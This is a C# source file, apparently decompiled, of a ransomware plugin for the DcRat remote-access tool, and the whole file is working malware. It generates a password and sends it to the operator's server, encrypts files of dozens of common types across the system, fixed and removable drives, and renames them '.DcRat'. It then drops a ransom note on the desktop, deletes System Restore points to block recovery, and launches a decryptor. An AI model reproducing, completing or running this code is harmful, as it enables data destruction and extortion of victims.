using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using MessagePackLib.MessagePack;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Plugin.Properties;

namespace Plugin.Handler;

public class HandleEncrypt
{
	public string password;

	private object C_DIR = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3);

	public object Mynote;

	public StringBuilder Logs = new StringBuilder();

	[DllImport("user32")]
	private static extern void keybd_event(byte bVk, byte bScan, long dwFlags, long dwExtraInfo);

	public void BeforeAttack()
	{
		new Thread(startAction).Start();
	}

	private byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes((int)((double)rijndaelManaged.KeySize / 8.0));
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes((int)((double)rijndaelManaged.BlockSize / 8.0));
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	private string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < Math.Max(Interlocked.Decrement(ref length), length + 1))
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private void EncryptFile(string file, string password)
	{
		try
		{
			if (file != Process.GetCurrentProcess().MainModule!.FileName && file != Application.get_StartupPath() && file != Directory.GetCurrentDirectory() && !file.ToLower().Contains(Environment.GetFolderPath(Environment.SpecialFolder.System).ToLower().Replace("system32", null)))
			{
				byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
				byte[] bytes = Encoding.UTF8.GetBytes(password);
				bytes = SHA256.Create().ComputeHash(bytes);
				byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
				File.WriteAllBytes(file, bytes2);
				File.Move(file, file + ".DcRat");
				Logs.Append(file + Environment.NewLine);
			}
		}
		catch (Exception ex)
		{
			Packet.Error(ex.Message);
		}
	}

	private void encryptDirectory(string location, string password)
	{
		try
		{
			string text = ".txt" + ".jar" + ".exe" + ".dat" + ".contact" + ".settings" + ".doc" + ".docx" + ".xls" + ".xlsx" + ".ppt" + ".pptx" + ".odt" + ".jpg" + ".png" + ".jpeg" + ".gif" + ".csv" + ".py" + ".sql" + ".mdb" + ".sln" + ".php" + ".asp" + ".aspx" + ".html" + ".htm" + ".xml" + ".psd" + ".pdf" + ".dll" + ".c" + ".cs" + ".vb" + ".mp3" + ".mp4" + ".f3d" + ".dwg" + ".cpp" + ".zip" + ".rar" + ".mov" + ".rtf" + ".bmp" + ".mkv" + ".avi" + ".apk" + ".lnk" + ".iso" + ".7z" + ".ace" + ".arj" + ".bz2" + ".cab" + ".gzip" + ".lzh" + ".tar" + ".uue" + ".xz" + ".z" + ".001" + ".mpeg" + ".mp3" + ".mpg" + ".core" + ".crproj" + ".pdb" + ".ico" + ".pas" + ".db" + ".torrent";
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			int i = 0;
			for (int num = files.Length - 1; i <= num; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (text.Contains(extension.ToLower()))
				{
					EncryptFile(files[i], password);
				}
			}
			int j = 0;
			for (int num2 = directories.Length - 1; j <= num2; j++)
			{
				encryptDirectory(directories[j], password);
			}
		}
		catch (Exception ex)
		{
			Packet.Error(ex.Message);
		}
	}

	private void startAction()
	{
		try
		{
			password = CreatePassword(15);
			Connection.Send(Password(password));
			Packet.Log(Connection.Hwid + "Encrypting...");
			Thread.Sleep(1000);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\" + Connection.Hwid, "Rans-Status", "Encryption in progress...");
			System_Driver(password);
			Fix_Drivers(password);
			Drivers(password);
			password = null;
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\" + Connection.Hwid, "Rans-Status", "Encrypted");
			SetMessage();
			DeleteRestorePoints();
			DropDecryptor();
			Packet.Log(Connection.Hwid + "Encrypted");
		}
		catch (Exception ex)
		{
			Packet.Error(ex.Message);
		}
	}

	private void System_Driver(string password)
	{
		encryptDirectory(Conversions.ToString(C_DIR), password);
	}

	private void Fix_Drivers(string password)
	{
		string[] logicalDrives = Environment.GetLogicalDrives();
		foreach (string text in logicalDrives)
		{
			DriveInfo driveInfo = new DriveInfo(text);
			if (driveInfo.DriveType == DriveType.Fixed && !driveInfo.ToString().Contains(Conversions.ToString(C_DIR)))
			{
				string location = text;
				encryptDirectory(location, password);
			}
		}
	}

	private void Drivers(string password)
	{
		string[] logicalDrives = Environment.GetLogicalDrives();
		foreach (string text in logicalDrives)
		{
			DriveInfo driveInfo = new DriveInfo(text);
			if (driveInfo.DriveType != DriveType.Fixed && !driveInfo.ToString().Contains(Conversions.ToString(C_DIR)))
			{
				string location = text;
				encryptDirectory(location, password);
			}
		}
	}

	private void SetMessage()
	{
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\READ-ME-NOW.txt";
			string text2 = Conversions.ToString((object)(Mynote?.ToString() + Environment.NewLine + "Your ID is [" + Connection.Hwid + "]"));
			File.WriteAllText(text, text2 + Environment.NewLine + Environment.NewLine + "[[Encrypted Files]]" + Environment.NewLine + Logs.ToString());
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\" + Connection.Hwid, "Rans-MSG", text2);
			Process.Start(text);
		}
		catch (Exception ex)
		{
			Packet.Error(ex.Message);
		}
	}

	[DllImport("Srclient.dll")]
	public static extern int SRRemoveRestorePoint(int index);

	private void DeleteRestorePoints()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Expected O, but got Unknown
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementObjectEnumerator enumerator = new ManagementClass("\\\\.\\root\\default", "systemrestore", new ObjectGetOptions()).GetInstances().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					SRRemoveRestorePoint(int.Parse(((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("sequencenumber").ToString()));
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			Packet.Error(ex.Message);
		}
	}

	private void DropDecryptor()
	{
		try
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "DECRYPT.exe");
			File.WriteAllBytes(text, Resources.Decrypter);
			Process.Start(text);
		}
		catch (Exception ex)
		{
			Packet.Error(ex.Message);
		}
	}

	public static byte[] Password(string password)
	{
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Pac_ket").AsString = "Password";
		msgPack.ForcePathObject("Hwid").AsString = Connection.Hwid;
		msgPack.ForcePathObject("Password").AsString = password;
		return msgPack.Encode2Bytes();
	}
}
